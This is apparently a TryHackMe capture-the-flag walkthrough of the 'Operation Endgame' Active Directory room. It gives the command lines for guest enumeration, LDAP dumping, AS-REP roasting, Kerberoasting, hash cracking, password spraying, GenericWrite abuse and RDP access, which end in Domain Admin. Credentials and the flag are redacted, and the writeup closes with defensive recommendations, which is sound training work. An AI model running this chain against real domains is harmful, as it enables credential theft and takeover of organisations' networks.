# 🐍 Operation Endgame — TryHackMe Penetration Testing Walkthrough

<p align="center">
  <img src="assets/figure-3-room-completion.png" width="100%" alt="Operation Endgame room completion">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/TryHackMe-Operation%20Endgame-red?style=for-the-badge&logo=tryhackme"/>
  <img src="https://img.shields.io/badge/Active%20Directory-Hard-orange?style=for-the-badge&logo=windows"/>
  <img src="https://img.shields.io/badge/Category-Active%20Directory-blue?style=for-the-badge"/>
</p>

---

## 📌 Overview

Operation Endgame is an Active Directory assessment demonstrating a multi-stage compromise of the `thm.local` domain.

The chain combines anonymous/Guest exposure, LDAP enumeration, Kerberos attacks, password reuse, BloodHound ACL analysis, targeted Kerberoasting, RDP and hardcoded credentials.

---

## 📑 Table of Contents

- Executive Summary
- Reconnaissance
- Active Directory Enumeration
- Kerberos
- Credential Access
- BloodHound
- Targeted Kerberoasting
- RDP
- Credential Discovery
- Domain Administrator
- Security Findings
- Remediation
- Lessons Learned
- Conclusion

---

# Executive Summary

```text
Domain Controller Discovery
       ↓
Anonymous / Guest Access
       ↓
LDAP User Enumeration
       ↓
Guest Kerberoasting
       ↓
Service Account Credential
       ↓
Password Reuse
       ↓
BloodHound
       ↓
GenericWrite ACL
       ↓
Targeted Kerberoasting
       ↓
RDP
       ↓
Hardcoded Credential Discovery
       ↓
Domain Administrator
```

---

# 1. Reconnaissance

A full TCP scan identifies DNS, IIS, Kerberos, LDAP, SMB, RPC, RDP and related Windows services.

The service combination is consistent with an Active Directory Domain Controller.

```bash
rustscan -a TARGET --range 1-65535 -- -A -sC -Pn
```

---

# 2. Anonymous and Guest Enumeration

Unauthenticated RPC and SMB sessions are accepted, although some enumeration operations are denied.

Guest access succeeds and RID brute forcing exposes additional domain identities.

```bash
smbclient //TARGET/ -U 'guest'
```

```bash
nxc smb TARGET -u 'guest' -p '' --rid-brute
```

---

# 3. LDAP Information Disclosure

Unauthenticated LDAP access reveals the domain naming context and user objects.

```bash
ldapsearch -x -H ldap://TARGET -b "DC=thm,DC=local"
```

This produces the large username set used in later Kerberos attacks.

---

# 4. AS-REP Roasting

The discovered accounts are tested for disabled Kerberos pre-authentication.

```bash
impacket-GetNPUsers thm.local/ \
  -dc-ip TARGET \
  -usersfile users.txt \
  -format hashcat
```

Multiple roastable accounts are identified, but the supplied wordlist does not recover usable credentials from this branch.

---

# 5. Guest Kerberoasting

Guest access allows a service ticket to be requested for `CODY_ROY`.

```bash
nxc ldap TARGET \
  -u guest -p '' \
  --kerberoasting output_hash.txt \
  --kdcHost TARGET
```

The resulting Kerberos hash is cracked with:

```bash
hashcat -m 13100 cody.hash /usr/share/wordlist/rockyou.txt
```

The password is redacted in the public edition.

---

# 6. Password Reuse

The recovered service-account password is tested against the enumerated user set.

```bash
kerbrute passwordspray \
  --dc TARGET \
  -d thm.local \
  users.txt \
  "REDACTED"
```

The source evidence shows that `ZACHARY_HUNT` also accepts the password.

---

# 7. BloodHound

BloodHound identifies:

```text
ZACHARY_HUNT
      ↓ GenericWrite
JERRI_LANCASTER
```

<p align="center">
  <img src="assets/figure-1-bloodhound-genericwrite.png" width="95%" alt="BloodHound GenericWrite evidence">
</p>

**Figure 01 — GenericWrite relationship enabling targeted Kerberoasting.**

---

# 8. Targeted Kerberoasting

The ACL is abused to target `JERRI_LANCASTER`.

```bash
targetedKerberoast.py \
  -d thm.local \
  -u ZACHARY_HUNT \
  -p 'REDACTED' \
  --dc-ip TARGET \
  --request-user JERRI_LANCASTER
```

The resulting Kerberos material is cracked with Hashcat.

---

# 9. RDP Access

Recovered credentials provide an RDP session.

```bash
xfreerdp3 \
  /u:JERRI_LANCASTER \
  /p:'REDACTED' \
  /v:TARGET
```

The session restrictions can be navigated through the Windows Run dialog to launch `cmd`.

---

# 10. Hardcoded Credentials

A custom script exists under:

```text
C:\Scripts\syncer.ps1
```

The script contains a domain username and password used for AD synchronization.

This is a critical secret-management failure because readable automation code becomes a credential store.

---

# 11. Domain Administrator

The discovered credentials validate successfully over SMB.

BloodHound confirms the identity is associated with Domain Admins.

<p align="center">
  <img src="assets/figure-2-bloodhound-domain-admins.png" width="95%" alt="BloodHound Domain Admin evidence">
</p>

**Figure 02 — Domain Administrator relationship and access to the domain controller.**

---

# 12. Final Access

RDP access as the Domain Administrator provides control of the target's administrative context.

The challenge flag is intentionally redacted.

---

# 13. Security Findings

| Finding | Severity |
|---|---|
| Anonymous / Guest exposure | 🔴 High |
| LDAP disclosure | 🟠 High |
| Guest Kerberoasting | 🔴 High |
| Password reuse | 🔴 High |
| GenericWrite ACL | 🔴 Critical |
| Hardcoded privileged credentials | 🔴 Critical |
| Domain Administrator compromise | 🔴 Critical |

---

# 14. Defensive Recommendations

- Disable unnecessary Guest and anonymous access.
- Restrict LDAP and SMB enumeration.
- Audit accounts without Kerberos pre-authentication.
- Reduce RC4-based Kerberos exposure.
- Use strong unique service-account passwords or gMSA.
- Audit `GenericWrite`, `GenericAll`, `WriteDACL` and similar permissions.
- Remove passwords from scripts.
- Use secure secret storage and managed identities.
- Restrict RDP.
- Monitor privileged account authentication.

---

# 15. Evidence

<p align="center">
  <img src="assets/figure-1-bloodhound-genericwrite.png" width="95%" alt="GenericWrite BloodHound evidence">
</p>

**Figure 01 — ACL abuse path.**

<p align="center">
  <img src="assets/figure-2-bloodhound-domain-admins.png" width="95%" alt="Domain Admin BloodHound evidence">
</p>

**Figure 02 — Domain Administrator relationship.**

<p align="center">
  <img src="assets/figure-3-room-completion.png" width="95%" alt="TryHackMe room completion">
</p>

**Figure 03 — TryHackMe room-completion evidence.**

---

# 16. Flag Policy

```text
Final Flag → [FLAG REDACTED]
```

---

# 17. Conclusion

Operation Endgame demonstrates that Active Directory compromise is often a chain of small identity and authorization weaknesses rather than a single exploit.

The reusable methodology is:

**enumerate → obtain credentials → test reuse → map ACLs → abuse relationships → move laterally → discover privileged secrets → validate administrative access**

---

**Author:** Anurag Ravankar
